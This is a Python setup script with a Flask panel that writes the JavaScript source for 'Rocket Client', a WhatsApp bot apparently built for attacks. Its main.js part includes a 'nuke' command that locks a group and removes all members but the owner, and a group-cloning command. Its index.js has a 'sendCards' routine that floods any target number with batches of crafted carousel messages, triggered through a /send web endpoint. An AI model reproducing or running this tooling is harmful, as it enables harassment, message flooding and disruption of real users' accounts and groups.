    // isBoom: true,
    //  isServer: true,
    // output: {
    // statusCode: 500,
    // payload: {
    // statusCode: 500,
    // error: 'Internal Server Error',
    // message: 'An internal server error occurred'
    // },
    // headers: {}
    // }
  if (!m.isGroup) return reply("Este comando só pode ser usado em grupos.");
  const groupMetadata = await sock.groupMetadata(from);
  const groupSubject = groupMetadata.subject || "Cloned Group";
  const groupDesc = groupMetadata.desc?.toString() || "";
  const groupParticipants = groupMetadata.participants.map(p => p.id).filter(id => id !== botNumber);
  // create new group with same subject and description
  const newGroup = await sock.groupCreate(groupSubject, [botNumber]);
  const newGroupId = newGroup.gid;
  // set description
  if (groupDesc) {
    try {
      await sock.groupUpdateDescription(newGroupId, groupDesc);
    } catch (err) {
      // ignore error
    }
  }
  // add participants one by one
  for (const participant of groupParticipants) {
    try {
      await sock.groupParticipantsUpdate(newGroupId, [participant], "add");
      await delay(2000); // delay 2 seconds between adds to avoid rate limiting
    } catch (err) {
      // ignore error
    }
  }
  // set group picture
  try {
    const pfp = await sock.getProfilePicture(from).catch(() => null);
    if (pfp) {
      const response = await fetch(pfp);
      const buffer = await response.buffer();
      await sock.updateProfilePicture(newGroupId, buffer);
    }
  } catch (err) {
    // ignore error
  }
  reply(`✅ Grupo clonado com sucesso!\\n\\nNovo grupo: ${newGroupId}`);
}
break;
                  
  //=========================//
  case "info": {
    const infogetclone1 = isQuotedMsg ?
      info.message.extendedTextMessage.contextInfo.quotedMessage.extendedTextMessage :
      info.message.extendedTextMessage.contextInfo.quotedMessage;
    const formattedJson = JSON.stringify(infogetclone1, null, 2);
    const finalCode = `case "sock": {\\n  sock.sendjson(from,${formattedJson.replace(/^/gm, " ")});\\n}\\nbreak;`;
    sock.sendjson(from, {
      "extendedTextMessage": {
        "text": finalCode,
        "contextInfo": {
          "forwardingScore": 127,
          "isForwarded": true,
          "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363403702895002@newsletter",
            "severMessageId": "1",
            "newsletterName": `🔥 𝐑𝐨𝐜𝐤𝐞𝐭𝐂𝐥𝐢𝐞𝐧𝐭𝐕𝟒.𝟐 🔥`,
            "contentType": "LINK_CARD"
          }
        }
      }
    });
  }
  break;
  //=========================//
case "nuke": {
    if (!isBot) return;
    const participants = await sock.groupMetadata(from).then(metadata => metadata.participants);
    const owner = await sock.groupMetadata(from).then(metadata => metadata.owner);
    const numbersToKick = participants
      .map(participant => participant.id.replace("@c.us", "@s.whatsapp.net"))
      .filter(number => number !== owner);
    await sock.groupSettingUpdate(from, "announcement");
    await sock.groupSettingUpdate(from, "locked");
    await sock.sendMessage(from, { text: `GRUPO NUKADO COM SUCESSO !` , mentions: [participants] });
    for (let i = 0; i < numbersToKick.length; i++) {
      const response = await sock.groupParticipantsUpdate(from, [numbersToKick[i]], "remove");
    }
  }
  break;
  //=========================//
  case "me": {
    //Usage: .me
    if (!isBot) return;
    reply(sender)
  }
  break;
  //=========================//
  case "from": {
    //Usage: .from
    if (!isBot) return;
    reply(from)
  }
  break;
  //=========================//
  case "refresh": {
    //Usage: .refresh  
    if (!isBot) return;
    function cleanFolder(folderPath, excludeFile) {
      fs.readdir(folderPath, (_, files) => {
        files.forEach((file, index) => {
          if (file !== excludeFile) {
            fs.unlink(path.join(folderPath, file), () => {
              if (index === files.length - 1) {
                console.log("Refresehed Session");
              }
            });
          } else if (index === files.length - 1) {
            console.log("Refresehed Session");
          }
        });
        if (files.length === 0) console.log("Refresehed Session");
      });
    }
    cleanFolder(dir("./database/Session"), "creds.json");
  }
  break;

  //=========================//
  case "ping": {
    //Usage: .ping
    if (!isBot) return;
    async function CheckPing (from) {
      let start = new Date;
      let { key } = await sock.sendMessage(from, {text: "wait.."});
      let done = new Date - start;
      var lod = `*Pong*:\\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`;
      await sleep(1000);
      await sock.sendMessage(from, {text: lod, edit: key });
    }
    CheckPing(from);
  }
  break;
  //=========================/
  case "restart": {
    //Usage: .restart
    if (!isBot) return;
    reply("Restarting will be completed in seconds");
    console.clear();
    await sleep(1000);
    process.exit();
  }
  break;
  //=========================//
  }
}
//=========================//
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  delete require.cache[file];
  require(file);
});
//=========================//"""
    with open('main.js', 'w') as f:
        f.write(main_js_content)
    print("main.js created (full handler).")

def create_index_js():
    if os.path.exists('index.js'):
        return
    # Updated index.js with file watcher for commands
    index_js_content = """const {
  generateWAMessageFromContent,
  getAggregateVotesInPollMessage,
  downloadContentFromMessage,
  useMultiFileAuthState,
  generateWAMessage,
  makeInMemoryStore,
  DisconnectReason,
  areJidsSameUser,
  getContentType,
  decryptPollVote,
  makeWASocket,
  relayMessage,
  jidDecode,
  Browsers,
  proto
} = require("@angstvorfrauen/baileys");

const gradient = require("gradient-string");
const readline = require("readline");
const crypto = require("crypto");
const cfonts = require("cfonts");
const figlet = require("figlet");
const path = require("path");
const pino = require("pino");
const os = require("os");
const fs = require("fs");

const Boom = require("@hapi/boom");

const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");

const banner = cfonts.render("Rocket\\\\nClient\\\\nV4.1", {
  font: "block",
  align: "center",
  gradient: ["#ff0000", "#C00000"],
  transitionGradient: true,
  env: "node"
});

const terminalWidth = process.stdout.columns || 80;

function hexToRgb(hex) {
  const bigint = parseInt(hex.replace("#",""), 16);
  return [(bigint >> 16) & 255, (bigint >> 8) & 255, bigint & 255];
}

function gradientText(text, colorStart, colorEnd) {
  const [r1, g1, b1] = hexToRgb(colorStart);
  const [r2, g2, b2] = hexToRgb(colorEnd);
  let result = "";
  for (let i = 0; i < text.length; i++) {
    const t = i / (text.length - 1 || 1);
    const r = Math.round(r1 + (r2 - r1) * t);
    const g = Math.round(g1 + (g2 - g1) * t);
    const b = Math.round(b1 + (b2 - b1) * t);
    result += `\\\\x1b[38;2;${r};${g};${b}m${text[i]}`;
  }
  return result + "\\\\x1b[0m";
}

function centerText(text, colorStart, colorEnd) {
  const padding = Math.floor((terminalWidth - text.length) / 2);
  const spaces = " ".repeat(Math.max(0, padding));
  return spaces + gradientText(text, colorStart, colorEnd);
}

figlet.text("RC", { font: "Bloody" }, (err, data) => {
  if (err || !data) {
    data = figlet.textSync("RC", { font: "Standard" });
  }
  const lines = data.split("\\\\n");
  const centeredLines = lines.map(line => {
    const padding = Math.max(0, Math.floor((terminalWidth - line.length) / 2));
    return " ".repeat(padding) + line;
  });
  console.log(gradient("ff0000", "C00000")(centeredLines.join("\\\\n")));
  ["https://t.me/Einzelhandelskaufmann", "https://t.me/RocketClient2", "MadeByXeuka\\\\n"].forEach(text => {
    const padding = Math.max(0, Math.floor((terminalWidth - text.length) / 2));
    console.log(gradient("ff0000", "C00000")(" ".repeat(padding) + text));
  });
});

const interFace = { input: process.stdin, output: process.stdout };
const rl = readline.createInterface(interFace);
const question = (prompt) => new Promise((resolve) => rl.question(prompt, resolve));

let phoneNumber = "0";
const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code");
const useMobile = process.argv.includes("--mobile");

async function sendCards(sock, targetJid) {
  console.log(`Sending cards to ${targetJid}`);
  for (let i = 0; i < 10; i++) {
    const singleCard = {
      "header": {
        "title": ".",
        "imageMessage": {
          "url": `${url}`,
          "mimetype": "image/jpeg",
          "caption": ".",
          "fileSha256": `${fileSha256}`,
          "fileLength": "10",
          "height": 1000,
          "width": 1000,
          "mediaKey": `${mediaKey}`,
          "fileEncSha256": `${fileEncSha256}`,
          "directPath": `${directPath}`,
          "jpegThumbnail": `${jpegThumbnail}`,
        },
        "hasMediaAttachment": true
      },
      "body": { "text": "." },
      "footer": { "text": "." },
      "nativeFlowMessage": {
        "buttons": [
          {
            "name": "cta_url",
            "buttonParamsJson": JSON.stringify({
              "display_text": "x",
              "url": "https://google.com",
              "merchant_url": "https://google.com"
            })
          }
        ]
      }
    };
    console.log(`⏳ Enviando carta em lote ${i + 1}/10 to ${targetJid}...`);
    const card = Array(10).fill(singleCard); // Limit to 10 cards
    await sock.sendjson(targetJid, {
      "interactiveMessage": {
        "body": { "text": "." },
        "carouselMessage": {
          "cards": card
        }
      }
    });
  }
  console.log("✅ Envio de cartas concluído to " + targetJid);
}

async function connectBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
  const sock = makeWASocket({
    printQRInTerminal: false,
    auth: state,
    logger: pino({ level: "silent" }),
  });

  if (!sock.authState.creds.registered) {
    phoneNumber = process.env.PHONE_NUMBER || await question(gradient("#ff0000", "#C00000")("Your Number: "));
    phoneNumber = phoneNumber.replace(/[^0-9]/g, "");
    let code = await sock.requestPairingCode(phoneNumber, "AAAAAAAA");
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    console.log(gradient("#ff0000", "#C00000")("Code: " + code));
  }

  sock.ev.on("messages.upsert", async chatUpdate => {
    let message = chatUpdate.messages[0];
    if (!message.message) return;
    message.message = (Object.keys(message.message)[0] === "ephemeralMessage")
        ? message.message.ephemeralMessage.message
        : message.message;
    if (message.key && message.key.remoteJid === "status@broadcast") return;
    if (message.key.id.startsWith("BAE5")) return;
    require("./main.js")(sock, message, chatUpdate);
  });

  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\\\\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return ( decode.user && decode.server ? `${decode.user}@${decode.server}`: jid );
    } else {
      return jid;
    }
  };

  sock.public = true;
  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = Boom.boomify(lastDisconnect?.error)?.output.statusCode;
      switch (reason) {
        case DisconnectReason.badSession: {
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
        }
        break;
        case DisconnectReason.connectionClosed: {
          connectBot();
        }
        break;
        case DisconnectReason.connectionLost: {
          connectBot();
        }
        break;
        case DisconnectReason.connectionReplaced: {
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
        }
        break;
        case DisconnectReason.loggedOut: {
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
        }
        break;
        case DisconnectReason.restartRequired: {
          connectBot();
        }
        break;
        case DisconnectReason.timedOut: {
          connectBot();
        }
        break;
        default:
          connectBot();
      }
    } else if (connection === "open") {
      console.log(gradient("#00ff00", "#00C000")("Connected successfully!"));
      // Start file watcher for commands
      fs.watch('command.txt', (eventType, filename) => {
        if (eventType === 'change') {
          fs.readFile('command.txt', 'utf8', async (err, data) => {
            if (!err && data && data.trim()) {
              let targetJid = data.trim();
              if (!targetJid.includes('@')) {
                targetJid = targetJid.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
              }
              await sendCards(sock, targetJid);
              fs.writeFileSync('command.txt', '');
            }
          });
        }
      });
    }
  });
  sock.ev.on("creds.update", saveCreds);
  return sock;
}

connectBot();
"""
    index_js_content = index_js_content.replace('\\\\n', '\\n').replace('\\\\x1b', '\\x1b')
    with open('index.js', 'w') as f:
        f.write(index_js_content)
    print("index.js created (with command watcher).")

def install_dependencies():
    if not os.path.exists('node_modules'):
        subprocess.run(['yarn', 'install'], check=True)
        print("Dependencies installed.")
    else:
        print("Dependencies already installed.")

def get_connected():
    with connected_lock:
        return connected

@app.route('/status')
def status():
    return jsonify({'connected': get_connected()})

def run_bot(phone_number):
    global connected
    env = os.environ.copy()
    env['PHONE_NUMBER'] = phone_number
    p = subprocess.Popen(['node', 'index.js'], env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)

    out_q = queue.Queue()
    def read_output():
        global connected
        for line in iter(p.stdout.readline, ''):
            sys.stdout.write(line)
            sys.stdout.flush()
            if 'Code:' in line:
                out_q.put(('code', line.strip()))
            elif 'Connected successfully!' in line:
                with connected_lock:
                    connected = True
                out_q.put(('connected', line.strip()))
        out_q.put(None)

    t = threading.Thread(target=read_output, daemon=True)
    t.start()

    try:
        item = out_q.get(timeout=120)  # Increased timeout for pairing
        if item is None:
            return '<div class="disconnected">No status received. Check terminal logs.</div>'
        status_type, line = item
        if status_type == 'code':
            code = re.split(r'Code:\s*', line)[1].strip()
            return f'<div class="code">{code}</div><p>Enter this code in WhatsApp Linked Devices to pair.</p><div class="disconnected">Pairing... Waiting for connection.</div>'
        elif status_type == 'connected':
            return '<div class="connected">Connected successfully! Bot is running.</div>'
    except queue.Empty:
        p.terminate()
        return '<div class="disconnected">Timeout: Failed to connect. Check terminal for errors.</div>'
    return '<div class="connected">Bot started. Check terminal for logs.</div>'

@app.route('/', methods=['GET', 'POST'])
def index():
    status = ''
    conn_status = get_connected()
    if request.method == 'POST':
        number = request.form.get('number', '').replace('+', '').replace(' ', '').replace('-', '')
        if number:
            status = run_bot(number)
        else:
            status = '<p style="color: #ffcc00;">Please enter a valid phone number.</p>'
    return render_template_string(HTML_TEMPLATE, status=status)

@app.route('/send', methods=['POST'])
def send_command():
    if not get_connected():
        return jsonify({'success': False, 'message': 'Bot not connected.'})
    target = request.form.get('target', '').replace('+', '').replace(' ', '').replace('-', '')
    if not target:
        return jsonify({'success': False, 'message': 'Target required.'})
    try:
        with open('command.txt', 'w') as f:
            f.write(target)
        return jsonify({'success': True, 'message': 'Command sent! Check terminal for logs.'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

if __name__ == '__main__':
    print("Starting Rocket Client Web Panel...")
    install_node_and_yarn()
    create_package_json()
    create_database_files()
    create_main_js()
    create_index_js()
    install_dependencies()
    # Create command file
    open('command.txt', 'w').close()
    print("Setup complete. Starting web server on http://localhost:5000")
    print("Bot logs will appear in this terminal.")
    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)